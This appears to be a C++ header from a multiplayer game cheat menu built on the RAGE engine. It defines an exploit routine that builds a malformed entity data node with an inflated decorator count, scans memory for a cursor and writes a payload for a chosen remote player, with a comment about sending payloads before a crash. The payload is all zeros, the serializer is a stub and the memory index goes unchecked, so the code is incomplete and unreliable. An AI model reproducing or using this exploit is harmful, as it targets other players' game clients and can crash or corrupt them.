#pragma once
#include "Pch/Common.hpp"
#include "R.A.G.Engine/Natives/NativeDefines.hpp"
#include "R.A.G.Engine/Joaat.hpp"
#include "R.A.G.Engine/DataNode.hpp"
#include "R.A.G.Engine/CNetGamePlayer.hpp"
#include "Util/Util.hpp"

namespace base::exploit {
	#define BAD_RESULT -1
	#define MAX_PAYLOAD_SIZE 144
	inline uint64_t g_cursor{};
	inline int scanMem(uint64_t* chunk, int size) {
		for (int i{}; i != size; ++i) {
			if (CDecorator* d = (CDecorator*)&chunk[i]; d && d->m_name_hash != "PWNED"_joaat) {
				if (chunk[i] == g_cursor) {
					printf("Found cursor in memory! Array index: %i\n", i);
					return i;
				}
			}
		}
		return BAD_RESULT;
	}
	inline CDynamicEntityGameStateDataNode setupEnvironment(void* node) {
		CDynamicEntityGameStateDataNode m_faultyNode{ *(CDynamicEntityGameStateDataNode*)node };
		CDecorator m_emptyDecor{ 1, 1, "PWNED"_joaat };
		m_faultyNode.m_decor_count = 12 + 10;
		for (auto& d : m_faultyNode.m_decors) {
			if (!d.isSet()) {
				d = m_emptyDecor;
			}
		}
		return m_faultyNode;
	}
	//3 payloads can be sent at a time before crashing
	inline void writePayload(uint64_t* target, uint64_t* payload, int payloadSize) {
		if (payloadSize > MAX_PAYLOAD_SIZE) {
			printf("Payload is above acceptable size!\n");
			return;
		}
		memcpy(&target[0], payload, payloadSize);
	}
	//Serialization: add("SDN", "E8 ? ? ? ? 84 C0 0F 95 C0 48 83 C4 58 C3 4C 8B DC", "call");
	//Part of NodeCommonDataperations<C(T)DataNode, I(T)NodeDataAccessor>
	bool SerializeDataNode(void** node, uint32_t size, CNetGamePlayer* sender, CNetGamePlayer* receiver, rage::datBitBuffer* buffer, int bufferSoze, uint64_t a7, bool a8, uint32_t* a9, uint32_t* a10) {
		return false;
	}
	inline void v1(Player target) {
		uint8_t tmpBuf[192]{};
		rage::datBitBuffer buffer{ &tmpBuf[0], 192, true };
		CNetGamePlayer* sender{ util::player::g_networkHandle };
		CNetGamePlayer* receiver{ util::network::getCNetGamePlayerViaConnectionId(target) };
		void* node{};
		uint32_t idx{};
		{
			uint32_t c{};
			SerializeDataNode(&node, sizeof(CDynamicEntityGameStateDataNode), sender, receiver, &buffer, 0, 0, false, nullptr, &c);
		}
		auto faultyNode = setupEnvironment(node);
		idx = scanMem(faultyNode.getArr(), faultyNode.getArrSize());
		uint64_t bytes[] = {
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
			 0x00, 0x00,
		};
		writePayload(&faultyNode.getArr()[idx], &bytes[0], SIZEOF(bytes));
	}
}